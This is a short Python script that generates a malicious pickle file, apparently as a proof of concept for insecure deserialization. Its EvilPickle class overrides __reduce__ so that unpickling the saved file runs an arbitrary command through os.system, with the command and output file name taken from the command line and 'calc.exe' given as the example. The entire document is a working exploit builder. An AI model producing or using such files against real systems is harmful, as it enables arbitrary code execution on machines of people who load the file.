import pickle
import sys

# This is the object to be unpickled
class EvilPickle(object):
    def __init__(self, command):
        self.command = command
    def __reduce__(self):
        import os
        return (os.system,(self.command,))

command = sys.argv[1]   # e.g. calc.exe
filename = sys.argv[2]

# create evil pickle and save it as dict file
exploit = EvilPickle(command)
evil_dict = pickle.dumps(exploit, protocol=2)
file=open(filename, "wb")
file.write(evil_dict)
file.close()
